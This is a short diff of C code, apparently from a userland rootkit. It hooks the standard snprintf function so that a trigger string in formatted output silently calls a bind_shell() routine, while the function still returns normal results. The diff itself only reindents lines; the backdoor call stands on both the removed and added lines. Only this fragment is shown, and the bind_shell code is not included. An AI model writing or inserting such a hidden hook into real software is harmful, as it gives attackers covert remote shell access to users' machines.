@@ -109,12 +109,13 @@ int snprintf(char *str, size_t size, const char *format, ...)
     char *trigger_found = strstr(buffer, TRIGGER_1);
     if (trigger_found != NULL)
     {
-	ret = new_snprintf(str, size, format, func_args);
-	bind_shell();
+	    ret = new_snprintf(str, size, format, func_args);
+	    bind_shell();
     }
+
     else
     {
-	ret = new_snprintf(str, size, format, func_args);
+	    ret = new_snprintf(str, size, format, func_args);
     }
 
     va_end(func_args);
